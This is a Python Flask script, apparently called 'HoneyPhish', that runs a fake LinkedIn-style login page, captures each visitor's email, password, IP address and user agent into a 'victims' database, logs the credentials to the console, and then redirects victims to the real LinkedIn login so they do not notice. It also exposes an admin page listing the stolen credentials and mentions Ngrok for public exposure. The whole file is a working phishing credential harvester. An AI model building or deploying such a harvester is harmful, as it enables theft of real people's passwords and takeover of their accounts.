from flask import Flask, render_template, request, redirect, url_for
import sqlite3
import datetime

app = Flask(__name__)

# --- 1. Database Setup (The Memory) ---
def init_db():
    conn = sqlite3.connect('captured_data.db')
    c = conn.cursor()
    # Create table to store email, password, AND tracking info
    c.execute('''CREATE TABLE IF NOT EXISTS victims 
                 (id INTEGER PRIMARY KEY, 
                  email TEXT, 
                  password TEXT, 
                  ip_address TEXT, 
                  user_agent TEXT, 
                  timestamp TEXT)''')
    conn.commit()
    conn.close()

# --- 2. The Trap (Fake Login Page) ---
@app.route('/', methods=['GET'])
def login():
    return render_template('login.html')

# --- 3. The Capture (Stealing the Data) ---
@app.route('/login', methods=['POST'])
def capture_credentials():
    # Get form data
    email = request.form.get('email')
    password = request.form.get('password')
    
    # Get Forensic Data
    # Check if the request has the 'X-Forwarded-For' header (from Ngrok)
    if request.headers.get('X-Forwarded-For'):
        # The header can contain multiple IPs, the first one is the victim's
        client_ip = request.headers.get('X-Forwarded-For').split(',')[0]
    else:
        # Fallback to the direct connection (localhost) if not using Ngrok
        client_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    time_now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Console Log (For your screenshot)
    print(f"\n[!] HIT RECEIVED at {time_now}")
    print(f"    Target: {client_ip} | {user_agent}")
    print(f"    CREDS: {email}:{password}")

    # Save to Database
    conn = sqlite3.connect('captured_data.db')
    c = conn.cursor()
    c.execute("INSERT INTO victims (email, password, ip_address, user_agent, timestamp) VALUES (?, ?, ?, ?, ?)",
              (email, password, client_ip, user_agent, time_now))
    conn.commit()
    conn.close()

    # Redirect to REAL LinkedIn so they don't suspect anything
    return redirect("https://www.linkedin.com/login")

# --- 4. The Admin Dashboard (Viewing the Data) ---
@app.route('/admin', methods=['GET'])
def admin_panel():
    conn = sqlite3.connect('captured_data.db')
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    c.execute("SELECT * FROM victims ORDER BY id DESC")
    rows = c.fetchall()
    conn.close()
    return render_template('dashboard.html', victims=rows)

if __name__ == '__main__':
    init_db()
    print("[*] HoneyPhish Server Running on http://0.0.0.0:5000")
    app.run(host='0.0.0.0', port=5000)
